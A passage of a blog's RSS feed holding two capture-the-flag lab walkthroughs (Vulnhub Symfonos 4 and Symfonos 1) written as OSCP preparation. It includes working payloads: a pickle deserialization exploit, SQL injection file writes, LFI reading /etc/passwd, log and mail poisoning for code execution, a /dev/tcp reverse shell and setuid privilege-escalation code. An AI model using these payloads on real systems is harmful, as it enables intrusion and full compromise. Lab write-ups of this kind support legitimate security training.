+| &lt;span style="color:#ae81ff">256&lt;/span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+|_ &lt;span style="color:#ae81ff">256&lt;/span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+80/tcp open http Apache httpd 2.4.38 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
+|_http-server-header: Apache/2.4.38 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="http-80">HTTP (80)&lt;/h2>
+&lt;p>On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
+and files.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-26.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Performing a bruteforce with ffuf we get a &lt;strong>gods&lt;/strong> directory.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style="color:#ae81ff">403&lt;/span> | tee root.ffuf
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>In this directory we only have some files, with nothing useful in them.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The contents:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>I decided to use the contents of the files to generate a wordlist for more bruteforce using curl.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>With this new words I performed bruteforce again but adding extensions.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>From this we discover &lt;strong>sea.php&lt;/strong> .&lt;/p>
+&lt;p>When we try to visit this file, we get redirected to atlantis.php which has a login form.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>On this form if we submit random creds, then visit sea.php afterwards. We are able to access it. I think this
+behaviour is related to the cookies the app sends after trying to login.&lt;/p>
+&lt;p>The sea.php has form that loads files based on the god we select. The contents are the log files we discovered
+in /gods. Based on this behaviour we can try and exploit lfi to get rce.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Since the on the url we are passing hades, and it loads content of hades.log. We can assume it appends .log
+to our input. This restricts us to only loading log files, but that should be sufficient for lfi to rce.&lt;/p>
+&lt;p>After testing a few log files I could only access auth.log which is located in /var/log/auth.log. These are ssh logs.&lt;/p>
+&lt;h1 id="getting-shell-as-www-data">Getting shell as www-data&lt;/h1>
+&lt;p>Let&amp;rsquo;s poison the ssh log by add php code in the username for rce.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We can pass the command id to test if we were successful.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>In the response we have www-data output. Now we can send our reverse shell payload.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-14.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Shell:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-15.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>In the webroot we can read atlantis.php that had the login form and here we get db creds.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-16.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The discovered password is also the password for the poseidon user.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-17.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
+&lt;p>Performing some manual enumeration locally for privesc paths, I took a look at local listening services. I
+discovered port 8080 which I used ssh portforwarding to access from my host.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-19.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>A simple web app is running.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-18.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Looking back at running processes, this appears to be a python app which is running as root. Looks like this is our
+path to privesc.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-21.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>In /opt I found the source code:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-20.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Based on the use of pickle, we need to exploit deserialization through the cookie.&lt;/p>
+&lt;p>I came up with the below script to generate a base64 encoded cookie which when deserialized
+will create a setuid binary of bash.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> jsonpickle
+&lt;span style="color:#f92672">import&lt;/span> base64
+&lt;span style="color:#f92672">import&lt;/span> os
+&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RCE&lt;/span>(object):
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">__reduce__&lt;/span>(self):
+cmd &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span>)
+&lt;span style="color:#66d9ef">return&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>system, (cmd,)
+encoded &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(jsonpickle&lt;span style="color:#f92672">.&lt;/span>encode(RCE()))
+&lt;span style="color:#66d9ef">print&lt;/span>(encoded)
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-22.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Setting the cookie and sending the request using burpsuite:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-23.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We get suidbash&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-24.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>And we finally get a root shell:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-25.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;h2 id="checking-the-redirect-on-accessing-the-seaphp">Checking the redirect on accessing the sea.php.&lt;/h2>
+&lt;p>The code on sea.php only checks if the session isset but not what value it is set to. From atlantis.php when you send wrong creds,
+the &lt;code>$_SESSION['logged_in']&lt;/code> is set to false.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-27.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h2 id="sql-injection-on-atlantisphp-login-form">SQL Injection on atlantis.php login form.&lt;/h2>
+&lt;p>When you supply username &lt;code>admin' or 1=1-- -&lt;/code> and a random password we get a redirect to sea.php but with
+&lt;code>admin' and 1=2-- -&lt;/code> we get a incorrect login.&lt;/p>
+&lt;p>This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file
+and exploit this with sqlmap.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-28.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sqlmap -r atlantis.req --batch --dump --level&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> --risk&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> --threads&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
+I tried this but couldn&amp;rsquo;t figure out why it failed but on revisiting it afterwards I figured out the issue.&lt;/p>
+&lt;p>Using this payload in my post request to write to a file using select, we don&amp;rsquo;t get the usual redirect that
+signifies that the query was successful.&lt;/p>
+&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'2' INTO OUTFILE '/tmp/test.log'-- -&amp;amp;password=a
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-29.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The file is actually written to disk if we check the /tmp folder.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-30.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The reason that we don&amp;rsquo;t get a redirect is that no rows are returned by the query when writing files therefore
+the php code returns a false and doesn&amp;rsquo;t redirect to sea.php.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-31.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Now if we try to include the test.log in /tmp using the lfi, it fails. The reason for this is because some services are
+configured to have a private tmp folder which isn&amp;rsquo;t the same as the usual /tmp. The below answer I found explains this.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-32.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>If you look at the previous screenshot you&amp;rsquo;ll notice the folders beginning with systemd-private and one of those seem to
+belong to apache2.&lt;/p>
+&lt;p>With this knowledge, we need to use other directories to write files in. Since we are exploiting sql injection for this,
+we need folders that the mysql user can write. I discovered /var/lib/mysql and /dev/shm are suitable for this.&lt;/p>
+&lt;p>Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to
+what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-existent file.&lt;/p>
+&lt;p>Testing this using /var/lib/mysql the file gets written.&lt;/p>
+&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'test' INTO OUTFILE '/var/lib/mysql/123456.log'-- -&amp;amp;password=a
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-33.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Then accessing it using the lfi works this time.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-34.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Something else also to note is that the db user in this case is the mysql root user.&lt;/p></content></item><item><title>Vulnhub: Symfonos 1</title><link>https://blog.ikuamike.io/posts/2021/symfonos1/</link><pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Beginner&lt;/td>
+&lt;td>29 June 2019&lt;/td>
+&lt;td>Zayotic&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-1,322/">https://vulnhub.com/entry/symfonos-1,322/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null&amp;rsquo;s OSCP
+Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.&lt;/p>
+&lt;p>In this box, initial access is through lfi to rce by using sending a payload in mail and accessing it.For privilege
+escalation we exploit a setuid binary that doesn&amp;rsquo;t use absolute paths, therefore hijacking the path gives us root.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>I already have the IP of the box.&lt;/p>
+&lt;p>Nmap output:&lt;/p>
+&lt;pre>&lt;code>Nmap scan report for 192.168.191.128
+Host is up (0.00025s latency).
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+| 2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
+| 256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
+|_ 256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
+25/tcp open smtp Postfix smtpd
+|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
+| ssl-cert: Subject: commonName=symfonos
+| Subject Alternative Name: DNS:symfonos
+| Not valid before: 2019-06-29T00:29:42
+|_Not valid after: 2029-06-26T00:29:42
+|_ssl-date: TLS randomness does not represent time
+80/tcp open http Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+Service Info: Hosts: symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
+|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| smb-os-discovery:
+| OS: Windows 6.1 (Samba 4.5.16-Debian)
+| Computer name: symfonos
+| NetBIOS computer name: SYMFONOS\x00
+| Domain name: \x00
+| FQDN: symfonos
+|_ System time: 2021-01-21T13:48:08-06:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2021-01-21T19:48:08
+|_ start_date: N/A
+&lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="samba-139445">Samba (139/445)&lt;/h2>
+&lt;p>Using enum4linux-ng we get 2 pieces of useful information.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">enum4linux-ng.py -A 192.168.191.128:
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>A user &lt;strong>helios&lt;/strong> is discovered&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos2.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>and the &lt;strong>anonymous&lt;/strong> share is accessible without credentials.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos3.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Using smbclient to access the share, there is a txt file.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.128&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos4.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Looking at the contents of attention.txt:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos5.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Now we have a username and possible passwords. The combination &lt;strong>helios:qwerty&lt;/strong> works and we can access
+the helios share.&lt;/p>
+&lt;p>We get access to more txt files, but only the todo.txt has valuable information.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos6.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>It gives an endpoint,that we can access on the webserver.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos7.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;h2 id="http-80">HTTP (80)&lt;/h2>
+&lt;p>When we access the endpoint we end up on a wordpress instance.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos8.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token &lt;span style="color:#f92672">[&lt;/span>redacted&lt;span style="color:#f92672">]&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
+&lt;li>mail-masta 1.0:&lt;/li>
+&lt;/ol>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos9.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;ol start="2">
+&lt;li>site-editor 1.1.1&lt;/li>
+&lt;/ol>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos10.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Using the PoC available on exploitdb: &lt;a href="https://www.exploit-db.com/exploits/40290/">https://www.exploit-db.com/exploits/40290/&lt;/a> , we can craft this url
+to read files such as /etc/passwd:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl&lt;span style="color:#f92672">=&lt;/span>/etc/passwd
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos11.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;h1 id="getting-shell-as-helios---lfi-to-rce">Getting shell as helios - LFI to RCE&lt;/h1>
+&lt;p>A typical method to escalate to RCE using LFI is poisoning log files but I wasn&amp;rsquo;t able to load any log
+file to use this method.
+With the presence of port 25 we can try sending an email and try accessing the email using LFI.&lt;/p>
+&lt;p>Sending email with payload:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos12.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.&lt;/p>
+&lt;pre>&lt;code class="language-url" data-lang="url">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=whoami
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos13.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Now we can get a reverse shell using this payload:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">/bin/bash -c &lt;span style="color:#e6db74">&amp;#34;/bin/bash -i &amp;gt;%26 /dev/tcp/192.168.191.1/9000 0&amp;gt;%261 %26&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
+&lt;p>Usual enumeration for privilege escalation involves looking for suid binaries by using find.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">find / -perm -4000 2&amp;gt;/dev/null
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The binary statuscheck isn&amp;rsquo;t among the linux default ones.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos14.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>After running it and then running strings against it, it calls the curl command when executed.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos15.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Since it doesn&amp;rsquo;t use the absolute path we can abuse this by setting our own PATH and make it call our own custom
+curl command.&lt;/p>
+&lt;p>In my custom curl script I get a copy of bash and give it suid permissions:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos16.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;h3 id="rooted">Rooted&lt;/h3>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos17.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;p>Better way to handle the sending email part using sendEmail:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &lt;span style="color:#e6db74">&amp;#34;Test Subject&amp;#34;&lt;/span> -m &lt;span style="color:#e6db74">&amp;#34;Test Message&amp;#34;&lt;/span> -o tls&lt;span style="color:#f92672">=&lt;/span>no
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Better suid exploit, compiling a c program that correctly sets the uid and gid as root.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span>&lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
+setgid(&lt;span style="color:#ae81ff">0&lt;/span>);
+setuid(&lt;span style="color:#ae81ff">0&lt;/span>);
+execl(&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos18.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
+&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p>
+&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p></content></item></channel></rss>
